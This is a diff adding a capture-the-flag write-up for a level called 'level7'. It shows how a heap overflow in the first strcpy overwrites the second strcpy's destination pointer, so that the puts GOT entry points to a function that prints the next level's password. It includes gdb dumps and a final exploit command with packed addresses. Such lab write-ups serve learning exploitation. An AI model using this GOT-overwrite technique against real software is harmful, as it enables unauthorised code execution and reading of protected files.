@@ -1,0 +1,45 @@
+We see that the function main mallocs 2 strings (+ 2 other that are not used),
+use strcpy(str1, argv[1]) and strcpy(str2, argv[2]), then opens the file "/home/user/level8/.pass"
+and reads it in a global variable.
+
+The function m prints the content of this variable, but is not called by the main function.
+
+The function main also calls puts at the end, which is loaded at runtime, using the plt/got:
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+
+(gdb) disass 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+
+We would like the second strcpy to override the adress at 0x8049928, so that the calls to puts actually calls the function m.
+
+For this we need to override the destination pointer of the second strcpy, which can be done by exploiting the first strcpy,
+which is not protected aginst overflows:
+
+To find the offset of the second string relative to the first one, we use gdb:
+
+(gdb) break *0x080485bd
+The breakpoint is just before the second strcpy, so that we can easilly find the arguments used when it is called
+
+(gdb) r aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkk nothing
+
+Breakpoint 1, 0x080485bd in main ()
+(gdb) x/a $esp
+0xbffff6e0:	0x66666666
+(gdb) x/a $esp + 4
+0xbffff6e4:	0xbffff90d
+(gdb) x/s 0xbffff90d
+0xbffff90d:	 "nothing"
+
+The target pointer for the second strcpy has been overridden by 0x66666666 (0x66 is 'f' in ascii),
+and the second argument is argv[2]
+
+We just need to find the adress of the function m:
+(gdb) info func ^m$
+Non-debugging symbols:
+0x080484f4  m
+
+Our exploit will then be:
+./level7 `python -c "print 'aaaabbbbccccddddeeee\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
